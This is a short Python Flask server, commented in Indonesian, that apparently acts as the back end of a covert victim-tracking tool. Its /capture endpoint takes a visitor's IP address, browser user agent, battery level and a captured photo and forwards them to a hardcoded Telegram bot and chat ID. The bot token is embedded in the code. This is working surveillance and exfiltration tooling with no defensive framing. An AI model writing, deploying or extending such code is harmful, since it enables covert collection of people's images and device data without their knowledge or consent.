from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

TELEGRAM_TOKEN = '8050641668:AAEytFzgrSClXd5ARv35WFjfMNXGpGA5mr4'
TELEGRAM_API_URL = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/'

@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    print("Captured Data:", data)
    
    # Kirim data ke bot Telegram
    chat_id = "6157377532"
    message = f"IP: {data['ip']}\nUser-Agent: {data['userAgent']}\nBattery: {data['battery']}\n"
    
    # Kirim foto jika ada
    if 'photo' in data:
        photo_url = data['photo']
        send_message(chat_id, message)
        send_photo(chat_id, photo_url)
    
    return jsonify({"status": "success"}), 200

def send_message(chat_id, text):
    requests.post(f'{TELEGRAM_API_URL}sendMessage', data={
        'chat_id': chat_id,
        'text': text
    })

def send_photo(chat_id, photo_url):
    requests.post(f'{TELEGRAM_API_URL}sendPhoto', data={
        'chat_id': chat_id,
        'photo': photo_url
    })

if __name__ == '__main__':
    app.run(debug=True)
